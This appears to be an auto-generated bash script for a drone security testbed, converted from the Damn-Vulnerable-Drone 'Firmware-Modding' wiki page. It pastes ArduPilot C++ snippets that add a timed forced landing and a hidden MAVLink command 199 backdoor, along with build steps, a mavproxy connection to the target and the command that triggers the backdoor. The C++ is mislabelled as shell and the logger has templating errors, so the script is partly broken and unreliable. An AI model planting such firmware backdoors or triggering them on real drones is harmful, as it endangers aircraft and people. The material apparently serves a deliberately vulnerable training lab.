#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Firmware-Modding.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition & Logging Setup
# ==========================================================
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")

# MTD 타겟 조회
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
POP_RESULT=$?
popd > /dev/null

if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

# 중앙 로거 함수 정의 (정확한 타임스탬프를 위해 쉘의 log 함수와 통합)
log() {{
    # 쉘 표준 로그 출력
    printf '[%(%F_%T)T] %s\n' -1 "$*"

    # bus.log에 JSON 이벤트 로깅
    EVENT_TYPE=$1
    shift
    EVENT_DATA_STR="$*"
    pushd "$PROJECT_ROOT" > /dev/null
    python3 -c "from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; log_bus_event('$EVENT_TYPE', {{'message': '$EVENT_DATA_STR'}})"
    popd > /dev/null
}}
# MTD_INTERFACE_END
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
fi

log "[ATTACK] id=firmware-modding src=Firmware-Modding.md"
log "[BLOCK 1] type=shell"
if (millis() > 30000) {
    gcs().send_text(MAV_SEVERITY_CRITICAL, "Malicious Landing Triggered.");
    set_mode(LAND, MODE_REASON_GCS_COMMAND);
}

log "[BLOCK 2] type=shell"
case 199:  // Arbitrary unassigned command
    gcs().send_text(MAV_SEVERITY_NOTICE, "Backdoor command received");
    set_mode(RTL, MODE_REASON_GCS_COMMAND);
    break;

log "[BLOCK 3] type=shell"
cd /opt/ardupilot
./waf distclean
./waf configure --board sitl
./waf copter

log "[BLOCK 4] type=shell"
build/sitl/bin/arducopter

log "[BLOCK 5] type=shell"
mavproxy.py --master=tcp:${TARGET_IP}:5760

log "[BLOCK 6] type=shell"
command long 1 1 199 0 0 0 0 0 0 0

log "[BLOCK 7] type=shell"
Backdoor command received

